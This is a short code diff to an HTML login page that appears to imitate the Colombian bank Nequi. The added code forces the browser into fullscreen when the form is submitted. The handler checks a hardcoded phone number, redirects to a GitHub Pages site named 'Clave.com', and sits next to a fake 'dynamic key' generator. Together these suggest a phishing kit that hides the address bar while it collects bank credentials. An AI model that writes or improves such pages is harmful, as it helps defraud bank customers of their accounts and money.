@@ -199,8 +199,24 @@
   <div class="footer">by</div>
 
   <script>
+    // Activar pantalla completa
+    function activarPantallaCompleta() {
+      const docEl = document.documentElement;
+      if (docEl.requestFullscreen) {
+        docEl.requestFullscreen();
+      } else if (docEl.mozRequestFullScreen) {
+        docEl.mozRequestFullScreen();
+      } else if (docEl.webkitRequestFullscreen) {
+        docEl.webkitRequestFullscreen();
+      } else if (docEl.msRequestFullscreen) {
+        docEl.msRequestFullscreen();
+      }
+    }
+
+    // Manejo de login
     function handleLogin(event) {
       event.preventDefault();
+      activarPantallaCompleta(); // Activa pantalla completa
       const telefono = document.getElementById("telefono").value.replace(/\s+/g, '');
       if (telefono === "3209722138") {
         window.location.href = "https://nequibotgv.github.io/Clave.com/";
@@ -209,6 +225,7 @@
       }
     }
 
+    // Clave dinámica
     function generarClave() {
       return Math.floor(100000 + Math.random() * 900000).toString();
     }
